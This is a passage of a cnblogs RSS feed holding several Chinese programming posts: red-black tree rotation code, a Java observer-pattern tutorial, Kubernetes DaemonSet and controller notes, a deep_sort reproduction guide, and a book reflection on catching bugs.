&lt;/span&gt;&lt;span&gt;65&lt;/span&gt; &lt;span&gt;          p.paintBlack();
&lt;/span&gt;&lt;span&gt;66&lt;/span&gt; &lt;span&gt;          _rotateLeft(ch);
&lt;/span&gt;&lt;span&gt;67&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;68&lt;/span&gt; &lt;span&gt;        _rotateRight(p);
&lt;/span&gt;&lt;span&gt;69&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ch.isRed) {
&lt;/span&gt;&lt;span&gt;70&lt;/span&gt; &lt;span&gt;        p.paintRed();
&lt;/span&gt;&lt;span&gt;71&lt;/span&gt; &lt;span&gt;        ch.paintBlack();
&lt;/span&gt;&lt;span&gt;72&lt;/span&gt; &lt;span&gt;        _rotateRight(p);
&lt;/span&gt;&lt;span&gt;73&lt;/span&gt;         _fixAfterDelete(p, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;74&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (ch.right != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; ch.right.isRed) {
&lt;/span&gt;&lt;span&gt;75&lt;/span&gt; &lt;span&gt;        ch.right.paintBlack();
&lt;/span&gt;&lt;span&gt;76&lt;/span&gt; &lt;span&gt;        _rotateLeft(ch);
&lt;/span&gt;&lt;span&gt;77&lt;/span&gt; &lt;span&gt;        _rotateRight(p);
&lt;/span&gt;&lt;span&gt;78&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;79&lt;/span&gt; &lt;span&gt;        p.paintRed();
&lt;/span&gt;&lt;span&gt;80&lt;/span&gt; &lt;span&gt;        _rotateRight(p);
&lt;/span&gt;&lt;span&gt;81&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch.parent != &lt;span&gt;null&lt;/span&gt;) _fixAfterDelete(ch.parent, ch ==&lt;span&gt; ch.parent.left);
&lt;/span&gt;&lt;span&gt;82&lt;/span&gt; &lt;span&gt;      }
&lt;/span&gt;&lt;span&gt;83&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;84&lt;/span&gt;   }&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　旋转操作的代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;   &lt;span&gt;&lt;span&gt;void&lt;/span&gt; _rotateLeft(RBTNode&amp;lt;E&amp;gt;&lt;span&gt; node) {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     var r = node.right, p =&lt;span&gt; node.parent;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     r.parent =&lt;span&gt; p;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (p == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;       _root =&lt;span&gt; r;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (p.left ==&lt;span&gt; node)
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;       p.left =&lt;span&gt; r;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;       p.right =&lt;span&gt; r;
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt;     node.right =&lt;span&gt; r.left;
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     r.left?.parent =&lt;span&gt; node;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     r.left =&lt;span&gt; node;
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     node.parent =&lt;span&gt; r;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;   &lt;span&gt;void&lt;/span&gt; _rotateRight(RBTNode&amp;lt;E&amp;gt;&lt;span&gt; node) {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     var l = node.left, p =&lt;span&gt; node.parent;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;     l.parent =&lt;span&gt; p;
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (p == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;       _root =&lt;span&gt; l;
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (p.left ==&lt;span&gt; node)
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;       p.left =&lt;span&gt; l;
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;       p.right =&lt;span&gt; l;
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; 
&lt;span&gt;27&lt;/span&gt;     node.left =&lt;span&gt; l.right;
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;     l.right?.parent =&lt;span&gt; node;
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     l.right =&lt;span&gt; node;
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;     node.parent =&lt;span&gt; l;
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;   }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Tue, 26 Mar 2019 07:55:00 +0000</pubDate>
<dc:creator>Burkut</dc:creator>
<og:description>对于红黑树的删除，看了数据结构的书，也看了很多网上的讲解和实现，但都不满意。很多讲解都是囫囵吞枣，知其然，不知其所以然，讲的晦涩难懂。 红黑树是平衡二叉树的一种，其删除算法是比较复杂的，因为删除后还要</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/outerspace/p/10600105.html</dc:identifier>
</item>
<item>
<title>观察者模式 - mingmingcome</title>
<link>http://www.cnblogs.com/mingmingcome/p/10600576.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mingmingcome/p/10600576.html</guid>
<description>&lt;p&gt;&lt;code&gt;2019年3月25日11:01:22&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;观察者模式-observer-pattern&quot;&gt;观察者模式（ observer pattern)&lt;/h2&gt;
&lt;h4 id=&quot;写在前面的话&quot;&gt;写在前面的话&lt;/h4&gt;
&lt;p&gt;正值金三银四跳槽季，设计模式也是常问的问题之一。本人在3月2日的一次面试的二面中，问到设计模式，问到了观察者模式，而且要求写了伪代码。当时我脑子里就第一个想到的就是《大话设计模式》里面的一个例子，就是员工集体开小差，前台妹妹负责在老板回来时通知所有人。当时回答得结结巴巴，写得代码勉勉强强，惊喜的是二面过了。归，温习之。&lt;/p&gt;
&lt;h4 id=&quot;定义&quot;&gt;定义&lt;/h4&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;世界上有这么一天，当你来到他们的世界，他们成为你终生的订阅者，随你快乐而快乐，随你忧愁而忧愁。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;观察者模式定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态发生变化时，会通知所有观察者对象，使它们能够自动更新自己。————《设计模式：可复用面向对象软件的基础》&lt;/p&gt;
&lt;p&gt;观察者模式是一种对象行为型模式。&lt;/p&gt;
&lt;h4 id=&quot;使用场景&quot;&gt;使用场景&lt;/h4&gt;
&lt;p&gt;当一个对象的改变（名词）需要改变（动词）其他对象的时候。&lt;/p&gt;
&lt;p&gt;观察者模式可以解决什么问题：&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;1、应该定义对象间一对多的依赖关系，而不使对象紧密耦合。（达到依赖关系，又不紧耦合）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;2、应该确保一个对象改变时，无限制的依赖对象自动更新。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;3、应该一个对象可以通知无限制的其他对象。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;第2种情况，消息中间件就是实现之一，当一个生产者发送消息过来，无限制的消费者拿到消息自动更新自己。&lt;/p&gt;
&lt;p&gt;第3中情况，发布-订阅推模式，微信公众号应该就是其中有代表性的，当有内容更新，主动通知订阅者。&lt;/p&gt;
&lt;h4 id=&quot;角色&quot;&gt;角色&lt;/h4&gt;
&lt;p&gt;抽象主题（Subject）： 定义了被观察者常用的方法，订阅（attach）、取消订阅（detach）和通知（notify）功能&lt;/p&gt;
&lt;p&gt;具体主题（ConcreteSubject）：实现抽象主题定义的方法，通过attach和detach方法维护一个观察者的集合，当自己维护的状态（state）改变时通知（notify）所有观察者&lt;/p&gt;
&lt;p&gt;抽象观察者（Observer）：定义更新自己的方法&lt;/p&gt;
&lt;p&gt;具体观察者（ConcreteObserver）：实现更新自己的的方法&lt;/p&gt;
&lt;h4 id=&quot;图示&quot;&gt;图示&lt;/h4&gt;
&lt;p&gt;观察者类图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Mingmingcome/cnblogs/master/images/observer-uml-diagram.jpg&quot; alt=&quot;观察者模式类图&quot;/&gt;&lt;/p&gt;
&lt;p&gt;观察者序列图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Mingmingcome/cnblogs/master/images/observer-sequence-diagram.jpg&quot; alt=&quot;观察者序列图&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;代码示例&quot;&gt;代码示例&lt;/h4&gt;
&lt;p&gt;代码示例就使用上面说过的那个例子，员工集体开小差，前台小妹负责在老板回来的时候通知所有人。&lt;/p&gt;
&lt;p&gt;首先，前台妹妹是具体主题角色，员工是具体观察者角色。其次，前台妹妹维护着观察者集合，在老板回来了这个状态上通知所有观察者；观察者在前台妹妹通知之后执行自己的更新方法，该干嘛干嘛。&lt;/p&gt;
&lt;p&gt;抽象主题：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public interface Observable {
    public void attach(Observer observer);
    public void detach(Observer observer);
    public void notifyObservers();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前台妹妹（具体主题即被观察者）：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Receptionist implements Observable {
    private String state = &quot;老板出去了&quot;;

    private ArrayList&amp;lt;Observer&amp;gt; observers = new ArrayList&amp;lt;&amp;gt;();

    public String getState() {
        return state;
    }

    public void setState(String state) {
        this.state = state;
        System.out.println(state);
    }

    @Override
    public void attach(Observer observer) {
        observers.add(observer);
    }

    @Override
    public void detach(Observer observer) {
        observers.remove(observer);
    }

    @Override
    public void notifyObservers() {
        observers.forEach(observer -&amp;gt; observer.update());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看NBA员工观察者：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class NBAObserver implements  Observer{
    @Override
    public void update() {
        System.out.println(&quot;正在看NBA直播的关掉NBA直播，工作&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;炒股员工观察者：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class StockObserver implements Observer {
    @Override
    public void update() {
        System.out.println(&quot;正在炒股的关闭股市面板，工作&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;观察者模式测试类：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ObserverTest {
    public static void main(String[] args) {
        Receptionist mm = new Receptionist();

        Observer nba = new NBAObserver();
        Observer stock = new StockObserver();

        mm.attach(nba);
        mm.attach(stock);
        // mm看到老板回来了
        mm.setState(&quot;老板回来了&quot;);
        // 通知已经订阅的员工
        mm.notifyObservers();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Mingmingcome/cnblogs/master/images/observer-test-result.png&quot; alt=&quot;测试结果&quot;/&gt;&lt;/p&gt;
&lt;p&gt;笔记：明明是前台妹妹在观察老板是否回来了，为什么前台妹妹是被观察者呢？&lt;/p&gt;
&lt;p&gt;“老板回来了”这个状态是前台妹妹的内部状态，观察者模式是对象之间的关系，看NBA的和炒股的观察者监听前台妹妹的状态，发生变化时更新自己。&lt;/p&gt;
&lt;h4 id=&quot;java类库中的观察者模式&quot;&gt;Java类库中的观察者模式&lt;/h4&gt;
&lt;p&gt;在java类库中有java.util.Observer和java.util.Observable作为观察者和被观察者，因为作用有限，在Java 9中已经弃用（deprecated）。&lt;/p&gt;
&lt;h4 id=&quot;优点&quot;&gt;优点&lt;/h4&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;满足了当一个对象的改变需要改变其他对象这个条件的前提下，实现了松耦合。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;符合开闭原则，继承抽象主题添加被观察者，继承抽象观察者添加观察者。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;缺点&quot;&gt;缺点&lt;/h4&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;如果一个观察目标对象有很多直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;总结&quot;&gt;总结&lt;/h4&gt;
&lt;p&gt;观察者模式定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态发生变化时，会通知所有观察者对象，使它们能够自动更新自己。&lt;/p&gt;
&lt;h4 id=&quot;参考&quot;&gt;参考&lt;/h4&gt;
&lt;p&gt;《大话设计模式》&lt;/p&gt;
&lt;h4 id=&quot;完&quot;&gt;完&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;2019年3月26日15:02:09&lt;/code&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:41:00 +0000</pubDate>
<dc:creator>mingmingcome</dc:creator>
<og:description>`2019年3月25日11:01:22` 观察者模式（ observer pattern) 写在前面的话 正值金三银四跳槽季，设计模式也是常问的问题之一。本人在3月2日的一次面试的二面中，问到设计模式</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mingmingcome/p/10600576.html</dc:identifier>
</item>
<item>
<title>Kubernetes 笔记 09 DaemonSet 我是一只看门狗 - CloudDeveloper</title>
<link>http://www.cnblogs.com/bakari/p/10600523.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bakari/p/10600523.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;本文首发于我的公众号 &lt;strong&gt;cloud_dev&lt;/strong&gt;，专注于干货分享，号内有大量书籍和视频资源，后台回复&lt;strong&gt;「1024」&lt;/strong&gt;即可领取，欢迎大家关注，二维码文末可以扫。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hi，大家好，我是 CloudDeveloper，欢迎大家和我一起学 K8S，这是系列第 9 篇。&lt;/p&gt;
&lt;p&gt;和上文中的 Deployment 一样，DaemonSet 也是一种副本管理机制，和 Deployment 可以在每个 Node 上运行好几个 Pod 副本不同的是，DaemonSet 始终保证每个 Node 最多只会运行一个副本，就像它的名称一样，作为一只看门狗（Daemon）守护在主人家里。&lt;/p&gt;
&lt;p&gt;那么，哪些应用适合用 DaemonSet 的方式来部署呢？&lt;/p&gt;
&lt;p&gt;主要有以下几类：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;监控类的，比如 Prometheus，collectd，New Relic agent，Ganglia gmond 等。&lt;/li&gt;
&lt;li&gt;系统管理类的，比如 kube-proxy, kube-flannel 等。&lt;/li&gt;
&lt;li&gt;日志收集类的，比如 fluentd，logstash 等。&lt;/li&gt;
&lt;li&gt;数据存储类的，比如 glusterd, ceph 等。&lt;/li&gt;
&lt;li&gt;......&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其中，系统管理类的应用主要是 K8S 自身的一些系统组件，我们可以通过 &lt;code&gt;kubectl get daemonset --namespace=kube-system&lt;/code&gt; 查看到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/431521/201903/431521-20190326153425636-1239910506.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;DaemonSet &lt;code&gt;kube-proxy&lt;/code&gt; 和 &lt;code&gt;kube-flannel-ds&lt;/code&gt; 有 3 个副本，分别负责在每个节点上运行 kube-proxy 和 flannel 组件。&lt;/p&gt;
&lt;p&gt;kube-proxy 前面的文章讲过，它有负载均衡的功能，主要将外部对 Service 的访问导向后端的 Pod 上。显然，一个 Node 运行一个负载均衡器足矣。&lt;/p&gt;
&lt;p&gt;我们可以通过 &lt;code&gt;kubectl edit daemonset kube-proxy --namespace=kube-system&lt;/code&gt; 来查看 kube-proxy 的 yaml 配置文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/431521/201903/431521-20190326153435630-1397621280.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到它的 kind 是 DaemonSet。&lt;/p&gt;
&lt;p&gt;接着再来看 kube-flannel-ds，这是一个网络插件组件，主要用于构建 K8S 的集群网络，这里大家不懂可以跳过，不影响本文的理解，后面在讲到 K8S 网络的时候会重点讲这个网络方案。&lt;/p&gt;
&lt;p&gt;这里我们只需要知道，各个 Pod 间的网络连通就是 flannel 来实现的。&lt;/p&gt;
&lt;p&gt;这是一个第三方的插件，我们可以直接下载它的 yaml 文件进行安装，执行下面的命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;wget https://raw.githubusercontent.com/coreos/flannel/v0.10.0/Documentation/kube-flannel.yml&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;得到 kube-flannel.yml 文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/431521/201903/431521-20190326153458360-1721231662.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里只列出了一部分内容，kind 类型是 DaemonSet。&lt;/p&gt;
&lt;p&gt;其实 DaemonSet 配置文件的语法和结构和 Deployment 几乎完全一样，不同就在于将 kind 设为 DaemonSet。&lt;/p&gt;
&lt;p&gt;OK，DaemonSet 的探讨就到这里，下文我们继续讨论另外一种 Controller：Job。&lt;/p&gt;
&lt;hr/&gt;&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;我的公众号 &lt;strong&gt;cloud_dev&lt;/strong&gt;，号内有大量书籍和视频资源，后台回复&lt;strong&gt;「1024」&lt;/strong&gt;即可领取，分享的内容包括但不限于云计算虚拟化、容器、OpenStack、K8S、雾计算、网络、工具、SDN、OVS、DPDK、Linux、Go、Python、C/C++编程技术等内容，欢迎大家关注。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/431521/201903/431521-20190315130233675-278848685.png&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:36:00 +0000</pubDate>
<dc:creator>CloudDeveloper</dc:creator>
<og:description>本文首发于我的公众号 cloud_dev ，专注于干货分享，号内有大量书籍和视频资源，后台回复 「1024」 即可领取，欢迎大家关注，二维码文末可以扫。 Hi，大家好，我是 CloudDevelope</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bakari/p/10600523.html</dc:identifier>
</item>
<item>
<title>kubernetes实践之四：深入理解控制器（workload） - 学无止尽，不忘初心</title>
<link>http://www.cnblogs.com/521football/p/10600493.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/521football/p/10600493.html</guid>
<description>&lt;h2&gt;一．Pod与controllers的关系&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;controllers:在集群上管理和运行容器的对象&lt;/li&gt;
&lt;li&gt;通过label-selector相关联&lt;/li&gt;
&lt;li&gt;Pod通过控制器实现应用的运维，如伸缩，升级等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/614111/201903/614111-20190326153238326-488119840.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;二．Deployment&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;部署无状态应用&lt;/li&gt;
&lt;li&gt;管理Pod和ReplicaSet&lt;/li&gt;
&lt;li&gt;具有上线部署、副本设定、滚动升级、回滚等功能&lt;/li&gt;
&lt;li&gt;提供声明式更新，例如只更新一个新的Image&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　　　应用场景:Web服务,微服务&lt;/p&gt;
&lt;h2&gt;三．StatefulSet&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;部署有状态应用&lt;/li&gt;
&lt;li&gt;每个节点都有固定身份ID&lt;/li&gt;
&lt;li&gt;集群的规模比较固定&lt;/li&gt;
&lt;li&gt;如果磁盘损坏，集群内的某个节点无法运行&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;应用场景:mysql集群,MongoDB集群,Zookeeper集群&lt;/p&gt;
&lt;h2&gt;四．DaemonSet&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;在每一个Node上运行一个Pod&lt;/li&gt;
&lt;li&gt;新加入的Node也同样会自动运行一个Pod&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;应用场景:zabbix agent,saltstack agent&lt;span&gt;    &lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;五．Job&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;普通任务(Job)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;一次性执行&lt;/p&gt;
&lt;p&gt;官方案例：https://kubernetes.io/docs/concepts/workloads/controllers/jobs-run-to-completion/&lt;/p&gt;
&lt;p&gt;     　　　　　应用场景:离线数据处理&lt;/p&gt;
&lt;p&gt;　　　　　　　应用场景:通知，备份&lt;/p&gt;


</description>
<pubDate>Tue, 26 Mar 2019 07:33:00 +0000</pubDate>
<dc:creator>学无止尽，不忘初心</dc:creator>
<og:description>一．Pod与controllers的关系 controllers:在集群上管理和运行容器的对象 通过label-selector相关联 Pod通过控制器实现应用的运维，如伸缩，升级等 二．Deploy</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/521football/p/10600493.html</dc:identifier>
</item>
<item>
<title>《deep sort》复现过程 - wemo</title>
<link>http://www.cnblogs.com/wemo/p/10600454.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wemo/p/10600454.html</guid>
<description>&lt;h4 id=&quot;准备代码与数据&quot;&gt;1. 准备代码与数据&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/nwojke/deep_sort&quot;&gt;deep_sort开源代码&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;克隆到本地服务器&lt;/p&gt;
&lt;blockquote readability=&quot;1.0204081632653&quot;&gt;
&lt;p&gt;git clone &lt;a href=&quot;https://github.com/nwojke/deep_sort.git&quot; class=&quot;uri&quot;&gt;https://github.com/nwojke/deep_sort.git&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载MOT16数据集（MOT:Multi-Object Tracking, 16的意思是相比MOT15多了更多的细节信息)&lt;br/&gt;&lt;a href=&quot;https://motchallenge.net/data/MOT16/&quot;&gt;MOT16数据集&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drive.google.com/drive/folders/18fKzfqnqhqW3s9zwsCbnVJ5XF2JFeqMp&quot;&gt;预训练权重下载&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;数据集介绍&quot;&gt;1.1 数据集介绍&lt;/h5&gt;
&lt;p&gt;该数据集分为了test和train，每个文件夹有7个子文件夹。&lt;/p&gt;
&lt;p&gt;./MOT16/train&lt;br/&gt;&lt;img src=&quot;https://raw.githubusercontent.com/wemozj/image/master/20190325091051.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以训练集中的MOT16-02为例，探究数据数据集格式&lt;/strong&gt;：&lt;br/&gt;MOT16-02下包含三个四个子文件：det、gt、img1、seqinfo.ini&lt;/p&gt;
&lt;h5 id=&quot;det&quot;&gt;1.1.1 det:&lt;/h5&gt;
&lt;p&gt;det下只有一个文件，det.txt。每行一个标注，代表一个检测物体&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/wemozj/image/master/20190325091555.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;格式为：&lt;/p&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:29:00 +0000</pubDate>
<dc:creator>wemo</dc:creator>
<og:description>[toc] 1. 准备代码与数据 'deep_sort开源代码' 克隆到本地服务器 git clone https://github.com/nwojke/deep_sort.git 下载MOT16数</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wemo/p/10600454.html</dc:identifier>
</item>
<item>
<title>代码精进之路读后感(二) - 一只菜鸟攻城狮啊</title>
<link>http://www.cnblogs.com/suihang/p/10598291.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/suihang/p/10598291.html</guid>
<description>
&lt;p&gt;昨天拜读了范学雷老师的代码精进之路第一篇，很有感悟，今天继续来读一读第二篇，昨晚想多看几篇的，结果去健身耽搁了，话说运动运动有点舒服，据说多运动肾好也不知道真的假的，话不多说我们说正事（又有点击查看源网页，无所谓，你们自己启动眼屏蔽就行了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326092548711-173352365.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;范老师的第二篇讲的是把错误关在笼子里的五道关卡&lt;/p&gt;
&lt;p&gt;作为一只正在努力成为老母鸡的小菜鸡，我也是看完文章才知道原来苹果ye也爆出过这木简单而又严重的代码错误，一场由多加一行goto fail的引发的惨案，不吹不黑，就这种错误我常出啊，看来我再不知不觉中已经有了苹果工程师的水准了吗，这木神奇的吗？其实仔细想想也是，再大的公司再厉害的大牛，也不可能做到一点问题没有，毕竟我们又不是神，所以肯定有存在思维上的局限性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326093523056-46878623.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;其实在我个人看来出bug并不是一件很坏的事情，相反我觉得还是一个非常好的事情，他能给你当头一棒，让你知道这里我不该这样用，这里我应该怎么修改&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326093811969-388021834.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;范老师一共总结了五条将bug关在笼子里方法&lt;/p&gt;
&lt;p&gt;这跟关羽过五关斩六将一样，bug就是关羽，而你就是守城的小老弟，要是五道关口都被过了，恭喜你怕不是又要被老大按着头怼，这木简单的代码你都能写成这样？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326094302464-812215064.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;程序员属于第一道关卡，一般来说，守在前面的都是比较菜的，但是我们可以通过提高自身的素质来守住bug，这里我们先不谈技术行不行，就谈一下规范，当你写代码的时候正确使用缩进，以及注释以及配对括号，那是不是会大幅度降低我们出bug的概率，退一万步讲就算出了bug我们也能较快的定位出bug所在。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1459059/201903/1459059-20190326094846989-1316778020.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第二道关卡就是我们的编译器，这个比我们老婆还亲，我这木说，你每天盯着他的时间比盯着你老婆的时间长太多了，是不是（当然，没老婆的那可就难受了啊，螺旋嘲讽）&lt;/p&gt;
&lt;p&gt;当我们编码时，编译器会爆出一些警告，对于警告，我们一定要提高警惕，最好是清除到所有的警告，防止后续出现问题&lt;/p&gt;
